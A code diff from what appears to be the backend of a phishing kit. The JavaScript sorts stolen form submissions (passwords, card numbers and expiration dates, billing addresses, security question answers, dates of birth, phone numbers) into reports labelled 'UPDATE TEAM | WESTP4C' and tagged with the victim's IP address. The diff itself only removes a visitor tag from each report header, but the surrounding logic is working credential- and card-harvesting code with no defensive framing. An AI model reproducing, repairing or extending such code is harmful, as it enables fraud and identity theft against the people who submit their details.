@@ -217,7 +217,7 @@ const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
 if (lowerCaseMyObjects.includes('password')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 LOGIN [${visitor}]\n\n`;
+               `👤 LOGIN \n\n`;
 
     for (const key of myObjects) {
         if (key.toLowerCase() !== 'visitor') {
@@ -245,7 +245,7 @@ if (lowerCaseMyObjects.includes('password')) {
 
 if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO [${visitor}]\n\n`;
+               `👤 CARD INFO \n\n`;
 
     for (const key of myObjects) {
         if (key.toLowerCase() !== 'visitor') {
@@ -264,7 +264,7 @@ if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes
 
 if (lowerCaseMyObjects.includes('message')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 SECURITY Q&A [${visitor}]\n\n`;
+               `👤 SECURITY Q&A \n\n`;
 
     for (const key of myObjects) {
         if (key.toLowerCase() !== 'visitor') {
@@ -283,7 +283,7 @@ if (lowerCaseMyObjects.includes('message')) {
 
 if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumber') || lowerCaseMyObjects.includes('state')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 CONTACT INFO [${visitor}]\n\n`;
+               `👤 CONTACT INFO \n\n`;
 
     for (const key of myObjects) {
         if (key.toLowerCase() !== 'visitor') {
